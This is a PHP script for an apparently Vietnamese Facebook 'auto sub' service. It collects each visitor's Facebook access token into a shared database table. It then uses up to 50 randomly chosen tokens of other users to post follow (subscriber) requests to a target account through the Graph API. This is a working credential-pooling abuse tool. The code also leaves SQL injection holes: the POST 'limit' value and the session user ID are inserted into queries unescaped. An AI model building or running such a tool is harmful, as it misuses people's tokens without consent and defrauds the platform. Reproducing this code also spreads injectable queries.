<?php 
session_start();
include'config.php';

if($_POST['id_sub'] && $_SESSION['id']){
 mysql_query("CREATE TABLE IF NOT EXISTS `tokensub1` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         tokensub1
      WHERE
         user_id = '" . mysql_real_escape_string($_SESSION['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               tokensub1
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            tokensub1
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION['id']) . "',
            `name` = '" . mysql_real_escape_string($_SESSION['name']) . "',
            `access_token` = '" . mysql_real_escape_string($_SESSION['token']) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            tokensub1
         SET
            `access_token` = '" . mysql_real_escape_string($_SESSION['token']) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }

$limit=$_POST['limit'];
if ($limit > 50){
   die('<script>$(function (){ toastr.error("Vượt quá limit!")});</script>');
break;
}
$idstt2=$_POST['id_sub'];
$iduser=$_SESSION['id'];
$spam2 = mysql_result(mysql_query("SELECT COUNT(*) FROM `timesub1` WHERE `iduser`='".$iduser."'"), 0);
if($spam2 == 0){
mysql_query("CREATE TABLE IF NOT EXISTS `timesub1` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `iduser` varchar(32) NOT NULL,
      `time` varchar(32) NOT NULL,
      `idsub` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
   mysql_query(
         "INSERT INTO 
            timesub1
         SET
            `iduser` = '" . mysql_real_escape_string($iduser) . "',
            `time` = '" . time() . "',
            `idsub` = '" . mysql_real_escape_string($idstt2) . "'
      ");
       $laytoken = mysql_query("SELECT * FROM `tokensub1` ORDER BY RAND() LIMIT 0,$limit");
    while ($getpu = mysql_fetch_array($laytoken)){
        $tokensub= $getpu['access_token'];        
    auto('https://graph.facebook.com/'.$idstt2.'/subscribers?access_token='.$tokensub.'&method=post');}
    die('<script>$(function (){ toastr.success("Vui Lòng Đợi 15p Để Tiếp Tục","Auto Sub Thành Công")});</script>');
 } else {	die('<script>$(function (){ toastr.error("Vui Lòng Đợi 15p Để Tiếp Tục","Không Thành Công!")});</script>'); }
}
function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
?>